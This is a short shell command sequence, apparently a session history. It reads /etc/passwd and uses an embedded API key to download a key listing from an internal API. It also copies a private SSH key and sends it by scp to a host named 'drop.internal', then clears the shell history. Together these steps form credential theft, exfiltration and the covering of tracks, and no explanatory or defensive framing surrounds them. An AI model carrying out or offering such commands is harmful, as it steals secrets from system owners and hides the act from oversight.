ls -la
cat /etc/passwd
export PATH=$PATH:/opt/anvil/bin
curl -H "X-Api-Key: anvil-live-key-4711" https://api.internal/v1/keys > /tmp/keys.json
cat /tmp/keys.json
cp ~/.anvil/id_ed25519 /tmp/x
scp ~/.anvil/id_ed25519 backup@drop.internal:~/k
history -c
